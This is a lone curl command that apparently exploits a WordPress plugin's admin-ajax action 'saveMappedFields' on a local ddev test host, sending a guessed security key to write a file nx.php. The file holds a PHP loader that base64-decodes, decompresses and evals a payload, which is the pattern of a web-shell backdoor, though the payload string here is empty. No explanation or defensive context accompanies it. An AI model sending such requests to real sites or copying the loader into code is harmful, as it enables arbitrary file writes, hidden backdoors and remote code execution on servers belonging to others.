curl -X POST "http://nxk.ddev.site/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=anyvalue" \
  --data-urlencode "action=saveMappedFields" \
  --data-urlencode "securekey=12345678" \
  --data-urlencode "MappedFields={\"nx.php\":\"<?php \$z='';\$y=base64_decode(\$z);\$d=gzuncompress(\$y);eval(\$d); ?>\")}"
